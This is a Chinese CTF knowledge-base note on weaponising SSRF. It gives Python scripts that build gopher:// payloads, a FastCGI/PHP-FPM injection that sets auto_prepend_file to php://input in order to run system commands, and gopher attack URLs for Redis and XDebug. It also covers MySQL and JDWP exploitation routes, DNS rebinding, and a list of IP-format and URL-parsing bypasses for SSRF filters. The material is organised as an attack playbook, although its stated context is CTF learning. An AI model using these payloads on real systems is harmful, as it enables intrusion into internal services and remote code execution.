---
title: SSRF 协议武器化 — Gopher 打 Redis/MySQL/FastCGI/调试器 + DNS Rebinding
tags: [ssrf, gopher, fastcgi, php-fpm, redis, mysql, dns-rebinding, xdebug, jdwp, 内网]
category: web
triggers: [ssrf, gopher, gopher 协议, fastcgi, php-fpm, 9000 端口, PHP_VALUE, auto_prepend_file, allow_url_include, redis 未授权, gopherus, mysql gopher, dns rebinding, DNS重绑定, ceye, xdebug, rpdb, jdwp, jdwp-shellifier, 数字ip绕过, 0x7f000001, 2130706433, 302 跳转 ssrf]
created: 2026-11-01
updated: 2026-11-01
sources: [https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/SSRF漏洞.md, https://hackerqwq.github.io/2020/11/16/浅析SSRF漏洞/, https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75]
---

# SSRF 协议武器化 — Gopher 打 Redis/MySQL/FastCGI/调试器 + DNS Rebinding

## Summary

SSRF 的价值不在「能请求内网」，而在**用 `gopher://` 把任意 TCP 字节流投递到内网服务**，从而把 HTTP-only 的 SSRF 升级成 Redis 写 shell、MySQL 认证包伪造、FastCGI 配置注入、以及调试器 RCE。过滤绕过则靠 IP 写法变体、302 跳转与 DNS Rebinding。

## Key Points

- `gopher://host:port/_<数据>` 中 `<数据>` 必须是**一次 URL 编码**；若这一层编码会被再解一次（如作为 GET 参数），则要**编两次**
- 打 Redis 用 Gopherus 生成；打 MySQL 需要目标出网回连（伪造认证包）；打 FastCGI 只需本机有任意 `.php` 文件
- `PHP_VALUE` 能改 `auto_prepend_file`，`PHP_ADMIN_VALUE` 能强制打开 `allow_url_include` —— 这两个是 FastCGI 打穿的根
- DNS Rebinding 专治「先解析校验、后二次请求」的过滤：第一次给合法 IP，第二次给 `127.0.0.1`
- 常见变体：`2130706433`、`0x7F000001`、`0177.0.0.1`、`127.1`、`[::1]`、`127.0.0.1.nip.io`

## Details

### Gopher 构造任意 HTTP 请求

```python
import urllib
payload = """POST /1.php HTTP/1.1
Host: 192.168.0.102
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

a=world
"""
s = urllib.parse.quote(payload).replace('%0A', '%0D%0A')
print('gopher://192.168.78.129:80/_' + s)
```

注意：`gopher` 需要在 Linux 下发起（Windows curl 不支持），且 `%0D%0A` 必须成对。

### 打 Redis

```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
```

用 [Gopherus](https://github.com/tarunkant/Gopherus) 直接生成；目标是写 webshell / 写 crontab / 主从复制 RCE。若 Redis 存的是 PHP 序列化数据（`serialize_php`），还可以**注入序列化对象触发反序列化**。

### 打 MySQL

需要目标可回连（伪造 MySQL 服务端认证包窃取 hash 或直接执行）。复现参考 ISITDTU 2018 Friss。

### 打 PHP-FPM / FastCGI（最实用）

前提：目标本机 `9000` 端口跑 PHP-FPM，且能找到任意一个 `.php` 路径。

核心思路：

1. 用 `PHP_VALUE` 把 `auto_prepend_file` 设为 `php://input`
2. 用 `PHP_ADMIN_VALUE` 把 `allow_url_include` 设为 `On`（`.htaccess` 里改不了这个，但 FastCGI 协议能改）
3. 请求体里带 `<?php system("ls");?>`

生成脚本（p 神 gist）：先本地监听 1234 端口写出二进制包到 `ssrf.txt`，再编码：

```python
import urllib.parse
f = open('ssrf.txt', 'rb'); s = urllib.parse.quote(f.read())
s = urllib.parse.quote(s)          # 双层编码
print('gopher://127.0.0.1:9000/_' + s)
```

包内关键字段：

```text
SCRIPT_FILENAME = /var/www/html/index.php
PHP_VALUE       = auto_prepend_file = php://input
PHP_ADMIN_VALUE = allow_url_include = On
CONTENT_LENGTH  = 21   (+ 请求体 <?php system("ls");?>)
```

### 打调试器（三语言拟态题的黄金三角）

| 语言 | 端口 | 协议 | 利用 |
|------|------|------|------|
| PHP + XDebug | `9000` / `13000` | `XDEBUG_SESSION_START` + `eval -i 1 -- <base64>` | gopher 直接执行 PHP |
| Python + rpdb | `4444` | 原生 socket | `open('/tmp/flag','w').write(...)`，再用 `file://` 读回 |
| Java + JDWP | 任意（如 `20211`） | JDWP | `jdwp-shellifier` 下断点 → 执行命令 |

gopher 打 XDebug 的构造示例（注意双层编码）：

```text
gopher://127.0.0.1:7410/_GET%2520%252Findex.php%253FXDEBUG_SESSION_START%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A7410%250D%250A...
```

### DNS Rebinding

针对这种过滤逻辑：

```php
$ip = gethostbyname(parse_url($url, PHP_URL_HOST));   // 第一次解析并校验
if (is_public_ip($ip)) curl_exec($url);               // 第二次解析发起请求
```

利用：自己的域名配两条 A 记录，一条指向合法公网 IP（TTL=0），一条指向 `127.0.0.1`；或直接用 `ceye.io` 等提供的 rebinding 域名。

### 过滤绕过清单

```text
http://2130706433/            # 十进制
http://0x7F000001/            # 十六进制
http://0177.0.0.1/            # 八进制
http://127.1/                 # 省略段
http://[::1]/                 # IPv6
http://127.0.0.1.nip.io/      # 泛解析域名
http://evil.com@127.0.0.1/    # URL 解析差异
302 跳转到内网地址             # 只校验第一跳
```

## 来源标注

| 技术 | 原始出处 | 比赛实例（已核验） |
|------|----------|-------------------|
| gopher + Redis（`serialize_php` 注入反序列化） | hackerqwq《浅析 SSRF 漏洞》 | **2022 春秋杯春季赛** easy-swoole（Redis `SERIALIZE_PHP` + 爬虫无协议过滤 → gopher 注入序列化数据 → EasySwoole `UploadFile::__destruct` + Prophecy/PHPUnit Mock 链 RCE） |
| gopher → FastCGI/PHP-FPM（`PHP_VALUE`/`PHP_ADMIN_VALUE`） | hackerqwq《浅析 SSRF 漏洞》+ phith0n gist | 通用 |
| gopher → XDebug / rpdb / JDWP 三语言调试器 | 春秋杯 WP | **2021 春秋杯秋季赛** mimic-ssrf（XDebug `13000`、rpdb `4444`、JDWP `20211`，三异构体全部打穿才过表决） |
| gopher → MySQL | hackerqwq（复现 xz.aliyun.com/t/2500） | **ISITDTU 2018** Friss |
| DNS Rebinding | hackerqwq | 通用 |
| IP 写法变体绕过 | 原文 Bypass 章节 + secpulse | 通用 |

## Connections

- Related: [[web/ssrf-gopher-techniques]]、[[web/file-protocol-redis-crlf-pickle-rce]]、[[web/aictf-layer-breach]]、[[web/php-lfi-getshell-advanced]]
- 语料索引：[[ctf/source-corpus--des-ctf-knowledge]]
- Source: [Des-CTF-Knowledge SSRF漏洞.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/SSRF漏洞.md)

## Open Questions

- PHP 8.x + FPM 默认配置下 `PHP_ADMIN_VALUE` 是否仍能改 `allow_url_include`（受 `clear_env` 与 `security.limit_extensions` 影响）？
